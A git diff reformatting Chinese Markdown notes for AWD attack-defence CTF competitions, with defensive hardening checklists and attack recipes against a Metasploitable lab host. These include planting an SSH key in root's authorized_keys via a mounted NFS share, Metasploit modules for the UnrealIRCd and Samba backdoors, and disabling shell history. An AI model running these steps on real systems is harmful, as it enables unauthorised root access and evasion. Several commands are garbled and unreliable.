@@ -1,66 +1,72 @@
 ## 准备
+
 [reverse shell manager](https://github.com/WangYihang/Platypus)
 [web shell manager](https://github.com/WangYihang/Webshell-Sniper)
-* 备份www
-* 备份passwd
-* linux_check
-* 修改默认口令 
-* 配置waf，文件监控，日志记录 
-* /var/www/html/ 设置为不可写
+
+- 备份 www
+- 备份 passwd
+- linux_check
+- 修改默认口令
+- 配置 waf，文件监控，日志记录
+- /var/www/html/ 设置为不可写
 
 ## blog
+
 https://0day.design/2018/12/20/HCTF%202018%20AWD%E5%B0%8F%E7%BB%93
 https://github.com/admintony/Prepare-for-AWD
-* D盾扫后门
-* chattr -i
-* 改cd ls curl wget常用命令
-* getflag所需命令改名
-* 
+
+- D 盾扫后门
+- chattr -i
+- 改 cd ls curl wget 常用命令
+- getflag 所需命令改名
+-
+
 ## 防御
-* webshell、后门、木马查杀
-  * http://www.shellpub.com/ 
-  * D盾
-  * 火绒
-* netstat：端口，连接排查方法 
-* 如何kill进程/防止kill
-* 改rw/a权限
-* 目录禁止写入
-* 删解释器
-* sql防注入代码
-* 日志管理
-* 文件监控
-* umask?
-* 网络端口监控
-* waf过滤sqlmap  //sql改head
-* 上传漏洞防护
-* webshell扫描器
-* linux后门发现chkrootkit
+
+- webshell、后门、木马查杀
+  - http://www.shellpub.com/
+  - D 盾
+  - 火绒
+- netstat：端口，连接排查方法
+- 如何 kill 进程/防止 kill
+- 改 rw/a 权限
+- 目录禁止写入
+- 删解释器
+- sql 防注入代码
+- 日志管理
+- 文件监控
+- umask?
+- 网络端口监控
+- waf 过滤 sqlmap //sql 改 head
+- 上传漏洞防护
+- webshell 扫描器
+- linux 后门发现 chkrootkit
 
 ## 攻击
-* 提权脚本
-* 白盒审计工具
-* 批量端口扫描 http，爆破phpmyadmin ssh mysql
-* 上传、权限维持脚本
-* 扫描webshell,路径爆破
-* 端口扫描
-* Cain4.9 多口令破解测试
-* arp欺骗工具
-* Wordpress 综合检测工具?
-* 各大cms get shell
-* 后门批量上传，管理
-* 后门开机启动 定时运行
-* 自动化程度提高
-* php 5.10 poc
-* xss 打cookie
-* 自动化攻击，提交
-* 中国特色字典
-* bash不记录历史记录
+
+- 提权脚本
+- 白盒审计工具
+- 批量端口扫描 http，爆破 phpmyadmin ssh mysql
+- 上传、权限维持脚本
+- 扫描 webshell,路径爆破
+- 端口扫描
+- Cain4.9 多口令破解测试
+- arp 欺骗工具
+- Wordpress 综合检测工具?
+- 各大 cms get shell
+- 后门批量上传，管理
+- 后门开机启动 定时运行
+- 自动化程度提高
+- php 5.10 poc
+- xss 打 cookie
+- 自动化攻击，提交
+- 中国特色字典
+- bash 不记录历史记录
 
 ```
 export HISTFILE=/dev/null
 export HISTSILZ
 ```
-
 
 ```bash
 lsb_release  -a
@@ -70,19 +76,21 @@ cat /etc/issue
 uname -a
 whoami
 ssh user@remote_server tail -f /var/log/apache2/access.log | ngxtop -f
-ssh msfadmin@192.168.189.131 tail -f /var/log/apache2/access.log | ngxtop -f 
+ssh msfadmin@192.168.189.131 tail -f /var/log/apache2/access.log | ngxtop -f
 ```
 
-
 ## 虚拟化判断
+
 https://www.bboysoul.com/2017/11/08/%E6%8E%A8%E8%8D%90%E4%B8%80%E4%B8%AA%E5%8F%AF%E4%BB%A5%E5%88%A4%E6%96%AD%E4%BD%A0%E7%9A%84vps%E4%BD%BF%E7%94%A8%E4%BB%80%E4%B9%88%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%E7%9A%84%E5%B7%A5%E5%85%B7/
-    
+  
 https://people.redhat.com/~rjones/virt-what/
 
 ## 发现
+
 angry ip scanner
 nmap
 msscan
+
 ## 常用命令
 
 ```shell
@@ -100,7 +108,7 @@ kill ‐ <PID>
 #封杀某个IP或者ip段，如:.
 iptables ‐I INPUT ‐s . ‐j DROP
 iptables ‐I INPUT ‐s ./ ‐j DROP #禁止从某个主机ssh远程访问登陆到本机，如123..
-iptable ‐t filter ‐A INPUT ‐s . ‐p tcp ‐‐dport ‐j DROP 
+iptable ‐t filter ‐A INPUT ‐s . ‐p tcp ‐‐dport ‐j DROP
 #备份mysql数据库
 mysqldump ‐u 用户名 ‐p 密码 数据库名 > back.sql
 mysqldump ‐‐all‐databases > bak.sql
@@ -110,7 +118,7 @@ find / *.php ‐perm
 awk ‐F: /etc/passwd
 crontab ‐l
 #检测所有的tcp连接数量及状态
-netstat ‐ant|awk |grep |sed ‐e ‐e |sort|uniq ‐c|sort ‐rn 
+netstat ‐ant|awk |grep |sed ‐e ‐e |sort|uniq ‐c|sort ‐rn
 #查看页面访问排名前十的IP
 cat /var/log/apache2/access.log | cut ‐f1 ‐d
 r | head ‐
@@ -118,8 +126,10 @@ r | head ‐
 cat /var/log/apache2/access.log | cut ‐f4 ‐d
 r | head ‐
 ```
+
 netstat ‐ant|awk |grep |sed ‐e ‐e |sort|uniq ‐c|sort ‐rn
 win:netstat -no 查看网络链接
+
 # 防御&&attack
 
 ## 防篡改
@@ -130,24 +140,22 @@ chattr +a /var/log 只能追加
 
 ## 进程检查
 
-如果我们怀疑某个进程正在是受到溢出攻击后创建的shell进程，我们可以分析这个进程是否有socket连接，linux中查看指定进程socket 连接数的命令为:
-比如我们查看ssh进程的socket连接。如果我们检测的程序有socket连接，说明它正在进行网络通信，我们就需要进行进一步判断。
+如果我们怀疑某个进程正在是受到溢出攻击后创建的 shell 进程，我们可以分析这个进程是否有 socket 连接，linux 中查看指定进程 socket 连接数的命令为:
+比如我们查看 ssh 进程的 socket 连接。如果我们检测的程序有 socket 连接，说明它正在进行网络通信，我们就需要进行进一步判断。
 
-
-## 检查nfs
+## 检查 nfs
 
 rpcinfo -p 192.168.189.131
 showmount -e
- mkdir /tmp/r00t
+mkdir /tmp/r00t
 
- mount -t nfs 192.168.99.131:/ /tmp/r00t/
+mount -t nfs 192.168.99.131:/ /tmp/r00t/
 
- cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys 
+cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys
 
- umount /tmp/r00t
+umount /tmp/r00t
 
-
- ssh root@192.168.99.131
+ssh root@192.168.99.131
 
 ## ftp ssh 配置文件检查
 
@@ -183,39 +191,38 @@ id;
 
 uid=0(root) gid=0(root)
 
-## 6667端口上运行着UnreaIRCD IRC
+## 6667 端口上运行着 UnreaIRCD IRC
 
- use exploit/unix/irc/unreal_ircd_3281_backdoor
- getshell
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+getshell
 
 ## ingreslock 后门
 
 telnet 192.168.99.131 1524
 
-## smb后门
+## smb 后门
 
-配置为文件权限可写同时"wide links" 被允许（默认就是允许），同样可以被作为后门而仅仅是文件共享。下面例子里，metasploit提供一个攻击模块，允许接入一个root文件系统通过一个匿名接入和可写入的共享设置。
+配置为文件权限可写同时"wide links" 被允许（默认就是允许），同样可以被作为后门而仅仅是文件共享。下面例子里，metasploit 提供一个攻击模块，允许接入一个 root 文件系统通过一个匿名接入和可写入的共享设置。
 smbclient -L //192.168.99.131
- use auxiliary/admin/smb/samba_symlink_traversal 
- set RHOST 192.168.99.131
-  set SMBSHARE tmp
-  exploit 
+use auxiliary/admin/smb/samba_symlink_traversal
+set RHOST 192.168.99.131
+set SMBSHARE tmp
+exploit
 
- smbclient //192.168.99.131/tmp
- getshell
- 
-## dwa后门
+smbclient //192.168.99.131/tmp
+getshell
+
+## dwa 后门
 
 Default username = admin
 Default password = password
 
 ##php 漏洞
-CVE–2012-1823和 CVE–2012-2311
+CVE–2012-1823 和 CVE–2012-2311
 
+# 查看页面访问排名前十的 IP
 
-# 查看页面访问排名前十的IP
-
-netstat ‐ant|awk |grep |sed ‐e ‐e |sort|uniq ‐c|sort ‐rn 
+netstat ‐ant|awk |grep |sed ‐e ‐e |sort|uniq ‐c|sort ‐rn
 
 http://bobao.360.cn/ctf/learning/210.html  
 https://bbs.ichunqiu.com/thread-25092-1-1.html?from=aqzx2
